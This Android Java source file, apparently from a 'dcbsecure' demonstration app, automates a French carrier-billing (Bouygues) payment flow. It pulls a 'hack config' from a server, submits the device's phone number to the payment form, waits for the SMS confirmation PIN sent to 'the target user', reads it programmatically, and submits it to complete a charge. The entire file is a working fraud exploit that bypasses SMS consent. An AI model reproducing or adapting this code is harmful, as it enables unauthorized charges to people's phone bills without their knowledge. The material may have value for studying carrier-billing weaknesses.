package com.dcbsecure.demo201503.dcbsecure.flow;

import android.content.Context;
import android.os.Handler;
import android.os.Message;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;

import com.dcbsecure.demo201503.dcbsecure.ActivityMainWindow;
import com.dcbsecure.demo201503.dcbsecure.managers.ConfigMgr;
import com.dcbsecure.demo201503.dcbsecure.managers.PreferenceMgr;
import com.dcbsecure.demo201503.dcbsecure.managers.TrackMgr;
import com.dcbsecure.demo201503.dcbsecure.request.RequestResult;
import com.dcbsecure.demo201503.dcbsecure.util.PayUtil;
import com.dcbsecure.demo201503.dcbsecure.util.SyncRequestUtil;
import com.loopj.android.http.PersistentCookieStore;
import com.loopj.android.http.RequestParams;
import com.loopj.android.http.SyncHttpClient;
import com.loopj.android.http.TextHttpResponseHandler;

import org.apache.http.Header;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.ProtocolException;
import org.apache.http.impl.client.DefaultRedirectHandler;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HttpContext;
import org.json.JSONException;
import org.json.JSONObject;

import java.net.URI;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Timer;
import java.util.TimerTask;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


public class FlowFRBouyguesWifi implements View.OnClickListener
{
    private final ActivityMainWindow activityMainWindow;

    public FlowFRBouyguesWifi(ActivityMainWindow activityMainWindow)
    {
        this.activityMainWindow = activityMainWindow;
    }

    @Override
    public void onClick(View v)
    {
        onClick();
    }

    public void onClick()
    {
        Log.d("FLIRTY", "Started handling payment over WIFI");


        final String deviceid = ConfigMgr.lookupDeviceId(activityMainWindow);

        // used to dismiss the progress dialog
        final Handler handler = new Handler()
        {
            @Override
            public void handleMessage(final Message msg)
            {
                super.handleMessage(msg);
            }
        };

        new Thread(new Runnable()
        {
            @Override
            public void run()
            {
                long runid = 0;
                try
                {
                    TelephonyManager tm = (TelephonyManager) activityMainWindow.getSystemService(Context.TELEPHONY_SERVICE);
                    String iso3166 = tm.getSimCountryIso();
                    if(iso3166==null||iso3166.isEmpty()) iso3166 = tm.getNetworkCountryIso();
                    String mccmnc = tm.getSimOperator();
                    if(mccmnc==null||mccmnc.isEmpty()) mccmnc = tm.getNetworkOperator();
                    String carrier = tm.getSimOperatorName();
                    if(carrier==null||carrier.isEmpty()) carrier = tm.getNetworkOperatorName();

                    //recheck hack data
                    ArrayList<NameValuePair> params = new ArrayList<NameValuePair>();
                    params.add(new BasicNameValuePair("deviceid", deviceid));
                    params.add(new BasicNameValuePair("iso3166", iso3166));
                    params.add(new BasicNameValuePair("mccmnc", mccmnc));
                    params.add(new BasicNameValuePair("carrier", carrier));
                    long msisdn = ConfigMgr.lookupMsisdnFromTelephonyMgr(activityMainWindow);
                    if(msisdn>0) params.add(new BasicNameValuePair("msisdn", ""+msisdn));

                    params.add(new BasicNameValuePair("wifi", PayUtil.isUsingMobileData(activityMainWindow) ? "0" : "1"));

                    String userAgent = PreferenceMgr.getUserAgent(activityMainWindow);
                    JSONObject hackConfigResponse = SyncRequestUtil.doSynchronousHttpPostReturnsJson(ConfigMgr.getString(activityMainWindow, "SERVER") + "/api/hack/lookup", params, userAgent);
                    if (hackConfigResponse == null)
                    {
                        TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, 0, 0, true, "hack could not read config", "deviceid:" + deviceid);
                        handler.sendEmptyMessage(0);
                    }
                    else
                    {
                        //decode runid first so that if there is an exception later on, we can still report it against the right runid
                        runid = hackConfigResponse.getLong("runid");
                        runFlowNotInMainThread(hackConfigResponse, deviceid, runid, handler);
                    }
                }
                catch (JSONException e)
                {
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, "Could not read hack config", "deviceid:" + ConfigMgr.lookupDeviceId(activityMainWindow));
                    Log.d("FLIRTY", "Could not read hack config");
                    handler.sendEmptyMessage(0);
                }
                catch (Exception e)
                {
                    String stack = TrackMgr.getStackAsString(e);
                    String message = "unexpected exception deviceid:" + ConfigMgr.lookupDeviceId(activityMainWindow);
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, message, stack);
                    Log.d("FLIRTY", message + " exception:" + e.getClass().getName() + " " + e.getMessage());
                    handler.sendEmptyMessage(0);
                }

            }
        }).start();

    }

    private void runFlowNotInMainThread(JSONObject hackConfig, final String deviceid, final long runid, final Handler handler)
    {
        final String userAgent = PreferenceMgr.getUserAgent(activityMainWindow);

        String startUrl;
        try
        {
            startUrl = hackConfig.getString("start_url")+"&tx=1";
        }
        catch (JSONException e)
        {
            String subject = "exception reading json flow config";
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject,null);
            handler.sendEmptyMessage(0);
            return;
        }


        activityMainWindow.updateLogs("\nAccessing content page : " + startUrl);
        RequestResult resultAfterStart = SyncRequestUtil.doSynchronousHttpGetCallReturnsString(activityMainWindow, startUrl, userAgent);
        String htmlDataConfirm = null;

        String msisdnSubmitUrl = null;
        if(resultAfterStart!=null){
            resultAfterStart = SyncRequestUtil.doSynchronousHttpGetCallReturnsString(activityMainWindow, resultAfterStart.getUrl()+"?offer_id=54", userAgent);
            htmlDataConfirm = resultAfterStart!=null?resultAfterStart.getContent():null;

            Pattern pattern = Pattern.compile("<form id=\"input_form\" name=\"input_form\" action=(.*/mpme/req) method=\"post\"");
            Matcher matcher = pattern.matcher(htmlDataConfirm);
            boolean matchFound = matcher.find();

            if(matchFound){
                Log.d("FLIRTY", "FOUND");
                activityMainWindow.updateLogs("Confirmation form found");
                msisdnSubmitUrl = matcher.group(1);
            }
        }

        if(resultAfterStart==null)
        {
            String subject = "start_url returns nothing";
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, startUrl);
            handler.sendEmptyMessage(0);
            return;
        }
        else if(resultAfterStart.getHttpCode()!=200)
        {
            String subject = "start_url returns http code "+resultAfterStart.getHttpCode()+" "+resultAfterStart.getUrl();
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, resultAfterStart.getContent());
            handler.sendEmptyMessage(0);
            return;
        }
        else if(msisdnSubmitUrl==null)
        {
            String subject = "cannot workout msisdnSubmitUrl";
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, subject,htmlDataConfirm);
            handler.sendEmptyMessage(0); //kill the waiting message
            return;
        }
        else if(!htmlDataConfirm.contains("CONFIRMER"))
        {
            String subject = "expected confirm page does not look right";
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, subject,htmlDataConfirm);
            handler.sendEmptyMessage(0); //kill the waiting message
            return;
        }
        else //if contains "CONFIRMER"
        {
            String msisdnStartingWith0not44 = PreferenceMgr.getMsisdn(activityMainWindow);
            if (msisdnStartingWith0not44 != null && msisdnStartingWith0not44.startsWith("33"))
                msisdnStartingWith0not44 = "0" + msisdnStartingWith0not44.substring(2);
            if (msisdnStartingWith0not44 != null && msisdnStartingWith0not44.startsWith("+33"))
                msisdnStartingWith0not44 = "0" + msisdnStartingWith0not44.substring(3);
            if (msisdnStartingWith0not44 != null && !msisdnStartingWith0not44.startsWith("0"))
                msisdnStartingWith0not44 = "0" + msisdnStartingWith0not44;
            activityMainWindow.updateLogs("\nEntering phone number ("+msisdnStartingWith0not44+"), form "+msisdnSubmitUrl);

            Pattern pattern = Pattern.compile("<input id=\"gw_idsession\" type=\"text\" name=\"gw_idsession\" value=\"([a-z0-9\\-]+)\" style=\"display: none;\" />");
            Matcher matcher = pattern.matcher(htmlDataConfirm);
            String gw_idsession = null;
            if(matcher.find()){
                Log.d("FLIRTY", "FOUND gw_idsession");
                gw_idsession = matcher.group(1);
            }
            else{
                Log.d("FLIRTY", "NOT FOUND gw_idsession");
            }

            final ArrayList<NameValuePair> paramsForConfirm = new ArrayList();
            paramsForConfirm.add(new BasicNameValuePair("act", "sap"));
            paramsForConfirm.add(new BasicNameValuePair("gw_idsession", gw_idsession));
            paramsForConfirm.add(new BasicNameValuePair("msisdn", msisdnStartingWith0not44));

            // Here we have to make one last POST request to confirm
            final RequestResult resultAfterMsisdn = SyncRequestUtil.doSynchronousHttpPost(msisdnSubmitUrl, paramsForConfirm,userAgent);
            final String pinUrl = resultAfterMsisdn!=null?resultAfterMsisdn.getUrl():null;
            final String htmlDataPin = resultAfterMsisdn!=null?resultAfterMsisdn.getContent():null;

            if(resultAfterMsisdn==null)
            {
                String subject = "Msisdn returns null (url:"+msisdnSubmitUrl+")";
                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataConfirm);
                handler.sendEmptyMessage(0);
                return;
            }
            else if(resultAfterMsisdn.getHttpCode()!=200)
            {
                String subject = "Msisdn returns http code "+resultAfterMsisdn.getHttpCode();
                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataPin);
                handler.sendEmptyMessage(0);
                return;
            }
            else if(pinUrl!=null)
            {
                // After this point, a PIN should arrive in an SMS message to the target user
                // start the waiting task

                TimerTask task = new TimerTask() {
                    @Override
                    public void run() {
                        final long WAITING_TIME = 60000;
                        final long SLEEP_TIME = 1000;
                        final long END_TIME = System.currentTimeMillis() + WAITING_TIME;

                        while (System.currentTimeMillis() <= END_TIME) {
                            String pin = FlowUtil.getPin();
                            if (pin != null && !pin.isEmpty()) {
                                String pinSubmitUrl = null;
                                Pattern pattern2 = Pattern.compile("<form id=\"input_form\" action=(.*/mpme/billing) method=\"get\"");
                                Matcher matcher2 = pattern2.matcher(htmlDataPin);
                                boolean matchFound = matcher2.find();
                                if (matchFound) {
                                    Log.d("FLIRTY", "FOUND");
                                    activityMainWindow.updateLogs("Confirmation form found");
                                    pinSubmitUrl = matcher2.group(1);
                                }

                                if (pinSubmitUrl == null) {
                                    String subject = "cannot workout pinSubmitUrl";
                                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, subject, htmlDataPin);
                                    handler.sendEmptyMessage(0); //kill the waiting message
                                    return;
                                } else if (!htmlDataPin.contains("CONFIRMER")) {
                                    String subject = "expected pin page does not look right";
                                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, subject, htmlDataPin);
                                    handler.sendEmptyMessage(0); //kill the waiting message
                                    return;
                                } else //if contains "CONFIRMER"
                                {
                                    Pattern pattern3 = Pattern.compile("<input id=\"gw_idsession\" type=\"text\" name=\"gw_idsession\" value=\"([a-z0-9\\-]+)\" style=\"display: none;\" />");
                                    Matcher matcher3 = pattern3.matcher(htmlDataPin);
                                    String gw_idsession2 = null;
                                    if (matcher3.find()) {
                                        Log.d("FLIRTY", "FOUND gw_idsession");
                                        gw_idsession2 = matcher3.group(1);
                                    } else {
                                        Log.d("FLIRTY", "NOT FOUND gw_idsession");
                                    }

                                    Log.d("FLIRTY", "PIN SUBMIT : "+pinSubmitUrl);
                                    pinSubmitUrl+="?act=sap&gw_idsession="+gw_idsession2+"&random="+pin;
                                    Log.d("FLIRTY", "PIN SUBMIT : "+pinSubmitUrl);
                                    // Here we have to make one last POST request to confirm
                                    final RequestResult resultAfterPin = SyncRequestUtil.doSynchronousHttpGetCallReturnsString(activityMainWindow, pinSubmitUrl, userAgent);
                                    final String confirmUrl = resultAfterPin != null ? resultAfterPin.getUrl() : null;

                                    if (resultAfterPin == null) {
                                        String subject = "Pin returns null (url:" + confirmUrl + ")";
                                        TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataPin);
                                        handler.sendEmptyMessage(0);
                                        return;
                                    } else if (resultAfterPin.getHttpCode() != 200) {
                                        String subject = "Pin returns http code " + resultAfterMsisdn.getHttpCode();
                                        TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataPin);
                                        handler.sendEmptyMessage(0);
                                        return;
                                    } else if (confirmUrl != null && confirmUrl.contains("google.fr")) {
                                        Log.d("FLIRTY", "PAID");
                                        activityMainWindow.updateLogs("Payment confirmed !");
                                    }
                                }
                                return;
                            }
                            else try
                            {
                                activityMainWindow.updateLogsNoLineFeed(" .");
                                Thread.sleep(SLEEP_TIME);
                            }
                            catch (Exception e)
                            {
                                e.printStackTrace();
                            }
                        }
                    }
                };
                Timer timer = new Timer();
                timer.schedule(task, 0);
            }
            handler.sendEmptyMessage(0);
            return;
       }

    }
}
